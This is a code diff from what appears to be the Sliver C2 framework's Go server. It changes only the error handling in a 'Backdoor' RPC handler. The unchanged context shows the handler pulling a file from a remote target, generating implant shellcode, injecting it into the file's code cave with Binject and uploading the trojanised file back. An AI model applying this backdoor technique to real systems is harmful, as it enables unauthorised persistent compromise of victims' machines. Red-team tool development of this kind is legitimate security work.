@@ -47,10 +47,10 @@ func (rpc *Server) Backdoor(ctx context.Context, req *clientpb.BackdoorReq) (*cl
 	if req.Name == "" {
 		name, err = codenames.GetCodename()
 		if err != nil {
-			return nil, err
+			return nil, rpcError(err)
 		}
 	} else if err := util.AllowedName(name); err != nil {
-		return nil, err
+		return nil, status.Error(codes.InvalidArgument, err.Error())
 	} else {
 		name = req.Name
 	}
@@ -68,18 +68,18 @@ func (rpc *Server) Backdoor(ctx context.Context, req *clientpb.BackdoorReq) (*cl
 		Path: req.FilePath,
 	})
 	if err != nil {
-		return nil, err
+		return nil, rpcError(err)
 	}
 	if download.Encoder == "gzip" {
 		download.Data, err = new(encoders.Gzip).Decode(download.Data)
 		if err != nil {
-			return nil, err
+			return nil, rpcError(err)
 		}
 	}
 
 	profiles, err := rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
 	if err != nil {
-		return nil, err
+		return nil, rpcError(err)
 	}
 	var p *clientpb.ImplantProfile
 	for _, prof := range profiles.Profiles {
@@ -88,38 +88,38 @@ func (rpc *Server) Backdoor(ctx context.Context, req *clientpb.BackdoorReq) (*cl
 		}
 	}
 	if p.GetName() == "" {
-		return nil, fmt.Errorf("no profile found for name %s", req.ProfileName)
+		return nil, status.Error(codes.InvalidArgument, fmt.Sprintf("no profile found for name %s", req.ProfileName))
 	}
 
 	if p.Config.Format != clientpb.OutputFormat_SHELLCODE {
-		return nil, fmt.Errorf("please select a profile targeting a shellcode format")
+		return nil, status.Error(codes.InvalidArgument, "please select a profile targeting a shellcode format")
 	}
 
 	build, err := generate.GenerateConfig(name, p.Config)
 	if err != nil {
-		return nil, err
+		return nil, rpcError(err)
 	}
 
 	// retrieve http c2 implant config
 	httpC2Config, err := db.LoadHTTPC2ConfigByName(p.Config.HTTPC2ConfigName)
 	if err != nil {
-		return nil, status.Error(codes.Internal, err.Error())
+		return nil, rpcError(err)
 	}
 
 	fPath, err := generate.SliverShellcode(name, build, p.Config, httpC2Config.ImplantConfig)
 	if err != nil {
-		return nil, status.Error(codes.Internal, err.Error())
+		return nil, rpcError(err)
 	}
 	shellcode, err := os.ReadFile(fPath)
 	if err != nil {
-		return nil, status.Error(codes.Internal, err.Error())
+		return nil, rpcError(err)
 	}
 	bjConfig := &bj.BinjectConfig{
 		CodeCaveMode: true,
 	}
 	newFile, err := bj.Binject(download.Data, shellcode, bjConfig)
 	if err != nil {
-		return nil, status.Error(codes.Internal, err.Error())
+		return nil, rpcError(err)
 	}
 	uploadGzip, _ := new(encoders.Gzip).Encode(newFile)
 	// upload to remote target
@@ -133,11 +133,11 @@ func (rpc *Server) Backdoor(ctx context.Context, req *clientpb.BackdoorReq) (*cl
 		},
 	})
 	if err != nil {
-		return nil, err
+		return nil, rpcError(err)
 	}
 
 	if upload.Response != nil && upload.Response.Err != "" {
-		return nil, fmt.Errorf("%s", upload.Response.Err)
+		return nil, status.Error(codes.FailedPrecondition, upload.Response.Err)
 	}
 
 	return resp, nil
